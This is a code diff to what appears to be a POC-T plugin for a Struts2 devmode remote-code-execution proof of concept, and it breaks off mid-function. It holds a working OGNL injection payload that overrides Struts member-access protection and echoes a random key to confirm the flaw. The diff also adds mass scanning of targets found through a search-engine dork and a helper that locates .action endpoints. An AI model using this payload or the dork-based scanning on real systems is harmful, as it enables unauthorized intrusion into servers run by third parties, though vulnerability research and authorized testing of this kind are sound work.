@@ -5,23 +5,26 @@
 
 """
 Struts S2-devmode RCE PoC
+  (redirectURL函数使用场景示例)
 
 Usage:
   python POC-T.py -T -m struts2-devmode -f [file]
+  python POC-T.py -T -m struts2-devmode --api --dork "index.action"
+
 """
 
 import requests
 from plugin.useragent import firefox
-from plugin.util import randomString
+from plugin.util import randomString, redirectURL
 
 
 def poc(url):
-    # if '|' in url:
-    #     url = url.split('|')[1]
     if '://' not in url:
         url = 'http://' + url
     if '?' in url:
         url = url.split('?')[0]
+    if '.action' not in url:
+        url = redirectURL(url)
     key = randomString()
     payload = "?debug=browser&object=(%23mem=%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f%23context[%23parameters.rpsobj[0]].getWriter().println(%23parameters.content[0]):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=" + key
     target = (url + payload)
